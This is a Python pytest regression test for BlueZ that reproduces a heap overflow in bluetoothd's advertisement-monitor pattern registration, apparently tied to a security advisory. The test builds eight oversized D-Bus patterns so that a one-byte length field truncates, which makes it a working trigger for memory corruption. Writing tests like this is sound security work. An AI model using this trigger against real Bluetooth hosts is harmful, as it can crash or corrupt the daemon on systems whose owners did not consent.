# -*- coding: utf-8; mode: python; eval: (blacken-mode); -*-
# SPDX-License-Identifier: LGPL-2.1-or-later
import dbus
import dbus.service
import pytest

from pytest_bluezenv import host_config, Bluetoothd, wait_until, mainloop_wrap, get_dbus


@host_config([Bluetoothd(conf="[General]\nExperimental = true")])
def test_adv_monitor_GHSA_hhgc_hfgf_8m4x(hosts):
    assert hosts[0].call(check_adv_monitor_GHSA_hhgc_hfgf_8m4x)


def check_adv_monitor_GHSA_hhgc_hfgf_8m4x(adapter="/org/bluez/hci0"):
    """NN-2026-0142 - Heap overflow via uint8 cp_len truncation in
    adv_monitor pattern registration (src/adv_monitor.c:1113-1125).
    """

    NUM_PATTERNS = 8
    PATTERN_SIZE = 34
    OBSERVE_SECS = 5.0
    APP_ROOT = "/NN20260142"

    def make_patterns():
        return dbus.Array(
            [
                dbus.Struct(
                    (
                        dbus.Byte(0),
                        dbus.Byte(0xFF),
                        dbus.Array([dbus.Byte(0x41)] * 31, signature="y"),
                    ),
                    signature="yyay",
                )
                for _ in range(NUM_PATTERNS)
            ],
            signature="(yyay)",
        )

    class Monitor(dbus.service.Object):
        def __init__(self, bus, path, patterns):
            super().__init__(bus, path)
            self.patterns = patterns

        @dbus.service.method(
            "org.freedesktop.DBus.Properties", in_signature="s", out_signature="a{sv}"
        )
        def GetAll(self, iface):
            return {
                "Type": dbus.String("or_patterns"),
                "Patterns": self.patterns,
            }

        @dbus.service.method("org.bluez.AdvertisementMonitor1")
        def Release(self):
            print("[*] monitor released")

        @dbus.service.method("org.bluez.AdvertisementMonitor1")
        def Activate(self):
            print(
                "[+] monitor activated (overflow already happened in "
                "the ADD_ADV_PATTERNS_MONITOR mgmt call)"
            )

    class App(dbus.service.Object):
        def __init__(self, bus, path, patterns):
            super().__init__(bus, path)
            self.monitor_path = dbus.ObjectPath(path + "/monitor0")
            self.monitor = Monitor(bus, self.monitor_path, patterns)

        @dbus.service.method(
            "org.freedesktop.DBus.ObjectManager", out_signature="a{oa{sa{sv}}}"
        )
        def GetManagedObjects(self):
            return {
                self.monitor_path: {
                    "org.bluez.AdvertisementMonitor1": self.monitor.GetAll(
                        "org.bluez.AdvertisementMonitor1"
                    )
                }
            }

    success = None

    def register_ok():
        nonlocal success
        print("[+] RegisterMonitor returned", flush=True)
        success = True

    def register_err(exc):
        nonlocal success
        print("[*] RegisterMonitor error:", exc, flush=True)
        success = False

    @mainloop_wrap
    def start_register():
        bus = get_dbus()

        app = App(bus, APP_ROOT, make_patterns())
        mgr = dbus.Interface(
            bus.get_object("org.bluez", adapter),
            "org.bluez.AdvertisementMonitorManager1",
        )

        cp_len = (1 + NUM_PATTERNS * PATTERN_SIZE) & 0xFF
        total_len = 1 + NUM_PATTERNS * PATTERN_SIZE
        print(
            "[*] RegisterMonitor with %d patterns: cp_len=%d total=%d"
            % (NUM_PATTERNS, cp_len, total_len),
            flush=True,
        )
        mgr.RegisterMonitor(
            dbus.ObjectPath(APP_ROOT),
            reply_handler=register_ok,
            error_handler=register_err,
        )

    start_register()

    wait_until(lambda: success is not None, timeout=OBSERVE_SECS)

    return success
